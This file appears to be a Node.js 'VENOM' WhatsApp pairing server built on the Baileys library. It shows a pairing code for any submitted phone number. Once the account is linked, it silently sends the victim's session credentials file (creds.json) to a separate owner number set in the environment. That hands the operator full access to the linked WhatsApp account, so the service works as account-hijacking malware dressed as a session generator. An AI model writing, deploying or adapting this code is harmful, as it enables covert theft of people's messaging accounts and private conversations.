const express = require("express")
const fs = require("fs")
const path = require("path")
const pino = require("pino")

const {
default: makeWASocket,
useMultiFileAuthState,
DisconnectReason,
fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys")

const app = express()

const sessionPath = "/opt/render/project/src/session"

if (!fs.existsSync(sessionPath)){
fs.mkdirSync(sessionPath,{recursive:true})
}

async function startSock(){

const { state, saveCreds } = await useMultiFileAuthState(sessionPath)

const { version } = await fetchLatestBaileysVersion()

const sock = makeWASocket({
logger:pino({level:"silent"}),
auth:state,
browser:["VENOM","CHROME","1.0.0"],
version
})

sock.ev.on("creds.update", saveCreds)

sock.ev.on("connection.update", async (update)=>{

const { connection, lastDisconnect } = update

if(connection === "close"){

const reason = lastDisconnect?.error?.output?.statusCode

if(reason !== DisconnectReason.loggedOut){
startSock()
}

}else if(connection === "open"){

console.log("✅ BOT CONNECTED")

setTimeout(async()=>{

try{

let creds = fs.readFileSync(path.join(sessionPath,"creds.json"))

await sock.sendMessage(
process.env.OWNER_NUMBER + "@s.whatsapp.net",
{
document:creds,
mimetype:"application/json",
fileName:"creds.json"
}
)

console.log("📩 Session Sent To Owner")

}catch(e){
console.log("❌ Error Sending Session")
}

},5000)

}

})

return sock
}

let sock

app.get("/pair", async (req,res)=>{

let number = req.query.number

if(!number) return res.send("Enter Number")

sock = await startSock()

setTimeout(async()=>{

try{

let code = await sock.requestPairingCode(number)

code = code?.match(/.{1,4}/g)?.join("-") || code

res.send(`<h2 style="color:red">${code}</h2>`)

}catch(e){

res.send("Error: Connection Closed")

}

},3000)

})

app.get("/",(req,res)=>{
res.sendFile(__dirname + "/index.html")
})

const PORT = process.env.PORT || 3000

app.listen(PORT,()=>{
console.log("🕷️ VENOM PAIR SERVER RUNNING")
})
